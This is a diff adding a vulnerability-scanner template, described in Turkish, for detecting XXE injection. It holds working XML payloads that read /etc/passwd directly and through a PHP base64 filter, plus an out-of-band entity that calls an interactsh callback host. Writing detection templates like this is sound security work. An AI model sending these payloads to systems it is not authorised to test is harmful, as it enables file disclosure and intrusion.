@@ -1,0 +1,101 @@
+id: xxe-injection
+
+info:
+  name: XML External Entity (XXE) Injection Detection
+  author: ertansa
+  severity: critical
+  description: |
+    XML ayrıştıran uç noktalara harici varlık (external entity) tanımı içeren XML
+    gövdesi göndererek XXE zafiyetini tespit eder. İki yöntem:
+      1) IN-BAND dosya okuma: `file:///etc/passwd` varlığı yanıt gövdesinde çözülürse
+         (`root:...:0:0:`) ateşler — deterministik, düşük FP.
+      2) OOB (out-of-band): harici varlık `http://{{interactsh-url}}` çağrısı
+         interactsh üzerinde DNS/HTTP etkileşimi oluşturursa ateşler (kör XXE).
+    Yaygın XML/SOAP/REST uçları ve Content-Type varyantları denenir. -dast gerektirmez.
+    OWASP Top 10: A05:2021 (Security Misconfiguration) / klasik A04:2017-XXE.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://portswigger.net/web-security/xxe
+    - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  classification:
+    cwe-id: CWE-611
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    max-request: 21
+  tags: xxe,injection,xml,oob,owasp,owasp-a05
+
+http:
+  - raw:
+      # IN-BAND: /etc/passwd oku
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <data>&xxe;</data>
+      # IN-BAND: php://filter ile base64 kaynak sızıntısı (PHP)
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+        <data>&xxe;</data>
+      # OOB: kör XXE — interactsh etkileşimi
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE data [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe">]>
+        <data>&xxe;</data>
+
+    payloads:
+      path:
+        - "/"
+        - "/api"
+        - "/xml"
+        - "/soap"
+        - "/rest"
+        - "/upload"
+        - "/ws"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # IN-BAND: /etc/passwd içeriği
+      - type: regex
+        name: inband-file-read
+        part: body
+        regex:
+          - "root:.*?:0:0:"
+          - "(bin|daemon|nobody):.*?:\\d+:\\d+:"
+
+      # IN-BAND: base64("root:") = cm9vdDo
+      - type: word
+        name: inband-php-filter
+        part: body
+        words:
+          - "cm9vdDo"
+
+      # OOB: interactsh etkileşimi (kör XXE)
+      - type: word
+        name: oob-interactsh
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:0:0:[^\\n]+"
